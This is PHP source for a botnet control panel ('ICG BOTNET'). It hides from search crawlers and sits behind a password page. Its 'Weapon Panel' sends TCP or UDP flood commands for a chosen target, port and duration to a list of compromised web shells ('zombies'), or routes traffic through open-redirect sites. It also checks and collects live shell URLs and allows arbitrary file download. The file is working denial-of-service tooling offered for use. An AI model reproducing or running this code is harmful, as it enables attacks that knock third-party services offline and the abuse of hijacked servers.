<?php
// ICG - BOTNET "Pace Usa Offical"
// Coded by Pace Usa Offical
// "Robot Solo Players Connection"
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; // Password default: admin <-- segera ganti hash nya dengan password anda
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
header('HTTP/1.0 404 Not Found');
exit;
}
}
function login_shell() {
?>
<html>
<head>
<title>ICG BOTNET "Pace Usa Offical"</title>
<style type="text/css">
html {
margin: 20px auto;
background: #FFFFFF;
color: green;
text-align: center;
}
header {
color: red;
margin: 10px auto;
}
input[type=password] {
width: 250px;
height: 25px;
color: red;
background: #000000;
border: 1px dotted red;
padding: 5px;
margin-left: 20px;
text-align: center;
}

@font-face {
  font-family: "HACKED";
  src: url("fonts/HACKED_Title.ttf");
}
</style>
</head>
<center>
	<link rel="icon" href="img/GSH.png" type="image/x-icon"/>	

<img src=img/GSH.png height=300 width=350><br>
<br><b><font face="HACKED" color="black" size="5">ICG BOTNET "Pace Usa Offic"</font><br><br>
<form method="post">
<input type="password" name="pass">
</form>
<b><font face="arial" color="black" size="3">Coded by Pace Usa Official  - "Robot Solo Players Connection"</font>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
@ob_clean();
$file = $_GET['file'];
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
readfile($file);
exit;
}
?>

<?////////////////////////////////////////////////////////////////////?>

<?php
set_time_limit(0);
ini_set('max_execution_time', 0);

?>

<?
{
echo'
<html>
<link rel="icon" href="img/GSH.png" type="image/x-icon"/>
<title>ICG BOTNET "Pace Usa Offical"</title>
<style>
@font-face {
  font-family: "HACKED";
  src: url("fonts/HACKED_Title.ttf");
}

</style>
<center>

        <link rel="stylesheet" href="css/bootstrap.css">
        <link rel="stylesheet" href="css/font-awesome.css">
        <link rel="stylesheet" href="css/bootstrap-responsive.css">
        <link rel="stylesheet" href="css/docs.css">
		<link rel="stylesheet" href="css/prettify.css">
		<link rel="stylesheet" href="css/sky-mega-menu.css">




<font face="HACKED">
<img src="img/yandere.png" height=600 width=300><h1>ICG BOTNET "Pace Usa Offical"</h1>


<div class="well">

<center>
<ul class="sky-mega-menu sky-mega-menu-response-to-icons sky-mega-menu-anim-scale">
			
<li aria-haspopup="true">
<a href="?Home"><i class="fa fa-home"></i> Home</a>


<li aria-haspopup="true"> 
<a href="?Weapon"><i class="fa fa-bomb"></i> Weapon Panel</a>
 
<li aria-haspopup="true">
<a href="?Clear"><i class="fa fa-file"></i>Clear Zombie List</a> 
 
<li aria-haspopup="true">
<a href="?Zombie"><i class="fa fa-space-shuttle"></i> Zombie Connection Checker</a>

 
<li aria-haspopup="true">
<a href="?Check"><i class="fa fa-signal"></i> Check Target Status Up / Down</a>

<li aria-haspopup="true"> 
<a href="?logout=true"><i class="fa fa-user"></i> Logout</a>
</center>

</html>';

} if (isset($_GET['Home'])) { // Menu Home
echo'
<style>
@font-face {
  font-family: "HACKED";
  src: url("fonts/HACKED_Title.ttf");
}
</style>
<center><br><br>
<font face="HACKED">
<center><h1>Hello "Otaku" World</h1></center><br>
<img src=img/header.jpg height=200 width=400><br>
<iframe src="guide.html" height="400" Width="400" frameborder="0"></iframe></html>';  
} if (isset($_GET['Weapon'])) { // Menu Weapon Panel
echo '
<!DOCTYPE html>
<br><br>
<html>
<style>
@font-face {
  font-family: "HACKED";
  src: url("fonts/HACKED_Title.ttf");
}
</style>
<center>
<font face="HACKED">
<h2>Weapons Panel</h2></font>
<center>
<br>
<form action="" method="post">
	<b>Target  (Dont use last slash /) : </b><br/>
	<input type="text" name="host" placeholder="Target ..."> <br/>
	<b>Port : </b><br/>
	<input type="number" name="port" placeholder="Port ..." value="25"><br/>
	<b>Time To DDos (s) :</b><br/>
	<input type="text" name="time" placeholder="Time to Ddos ..." value="3"> <br/>
	<b>Your Access password (Default: gsh1337)</b><br/>
	<input type="Password" name="pass" placeholder="Your Zombie Soldier Password" value="gsh1337"><br/>
	<b>Flood Type : </b><br/>
	<select name="type">
		<option value="tcp://">TCP</option>
		<option value="udp://">UDP</option>
	</select><br/>
	<b>Flood method (Use OpenRedirect Websites OR use server accesses) :</b> <br/>
	<select name="method">
		<option value="2">
			Use server Php access (Zombies)
		</option>
		<option value="1">
			Use OpenRdirect sites (Or zombies)
		</option>

	</select>
	<br/><br/>
	<input type="submit" name="submit"><br/>
</form>
<br/><br/>
</body>
</html>';
} if(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['pass']) && isset($_POST['time']) && isset($_POST['type']) && $_POST['method']=="1"){
	$pass = $_POST['pass'];
	$host = $_POST['host'];
	$port = $_POST['port'];
	$type = $_POST['type'];
	$time = $_POST['time'];
	$op = file_get_contents("Zombies/orzombies.txt");
	$zombies = explode("\n", $op);
	foreach ($zombies as $zombie) {
		$url = $zombie.$host;
		$c = curl_init();
		$opt = array(
			CURLOPT_URL => $url,
			CURLOPT_POST => true,
			CURLOPT_RETURNTRANSFER => false,
			CURLOPT_HEADER => true,
			CURLOPT_FOLLOWLOCATION =>false,
			CURLOPT_NOBODY => true
			);
		curl_setopt_array($c, $opt);
		$res = curl_exec($c);
		curl_close($c);
		echo $res."<br/>";
}}
elseif(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['pass']) && isset($_POST['time']) && isset($_POST['type']) && $_POST['method']=="2"){

	$pass = $_POST['pass'];
	$host = $_POST['host'];
	if(preg_match("/http:\/\//", $host)){
		$host = str_replace("http://", "", $host);
	}elseif(preg_match("/https:\/\//", $host)){
		$host = str_replace("https://", "", $host);
	}
	$port = $_POST['port'];
	$type = $_POST['type'];
	$time = $_POST['time'];
	$data = array(
		"type" => "$type",
		"host" => "$host",
		"time" => "$time",
		"port" => "$port",
		"pass" => "$pass"
		);

	$access = file_get_contents("Zombies/Zombies.txt");
	$accesss = explode("\r\n", $access);
	foreach ($accesss as $zombie) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $zombie);
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, $data);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_HEADER, true);
        $res = curl_exec($c);
        curl_close($c);
        echo "Command Sent to $zombie <br/>Target is: <br/>$type$host:$port<br/>$res<hr>";
}
}
if (isset($_GET['Zombie']))  // Menu Zombie Connection Checker 
echo "<style type=\"text/css\">
.entryfield {width:400px;height:200px;}
@font-face {
  font-family: 'HACKED';
  src: url('fonts/HACKED_Title.ttf');
}
</style>
<center>
<font face='HACKED'>
<h2>Zombie Soldier Connection Status Checker</h2></font>
<form name=\"frmcontadd\" action=\"\" method=\"post\">

  <textarea class=\"entryfield\" name=\"url\" cols=115 rows=10></textarea><br>
  <br>
  <input class=\"subbtn\" type=\"submit\" name=\"Submit\" value=\"Check Connection\">

</form>";
function get_http_response_code($theurl) {
    $headers = get_headers($theurl);
    $status = substr($headers[0], 9, 3);
    $p = parse_url($theurl);
    $host = explode(':', $p['host']);
    $hostname = $host[0];
    if ($status == 200) {
        $visitor = $_SERVER["REMOTE_ADDRS"];
        $judul = "shell: $theurl ";
        $body = "shell: $theurl";
        if (!empty($theurl)) {
        }
        $writeuRl = $theurl . "
";
        $fh = fopen("Zombies/Zombies.txt", "a");
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=Green>Boss Zombies Ready To Attack !!! </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } elseif ($status == 500) {
        echo "<strong><font color=black>" . $status . " Sorry Boss 500 Internal Server Error  </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    } else {
        $writeuRl = $theurl . "
";
        fwrite($fh, $writeuRl, strlen($writeuRl));
        echo "<strong><font color=red>Boss Zombies Not Found </font></strong> - <a href=\"" . $theurl . "\" target=_blank>" . $theurl . "</a><br />";
    }
}
if (isset($_POST['Submit'])) {
    $hosts = explode("
", $_POST['url']);
   
    $values = array();
    foreach ($hosts as $host) {
        if ($host != "") {
            @get_http_response_code("$host");
        }
    }
    echo "<br /><strong>Finish.. :D</strong>";

} if (isset($_GET['Clear'])) { // Clear Zombie List
echo'<iframe align="center" src="clear.php" height="200" width="400" frameborder="0" scrolling="auto" noresize></iframe>';


} if (isset($_GET['Check'])) { // Menu Check Target status Up / down
echo'
<html>
<h2>Check Target status Up / down</h2><br>
<iframe src="http://www.websitedown.info" height="400" Width="400" frameborder="0"></iframe></html>';

// Logout 
}if($_GET['logout'] == true) {
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
echo "<script>window.location='?';</script>";
}
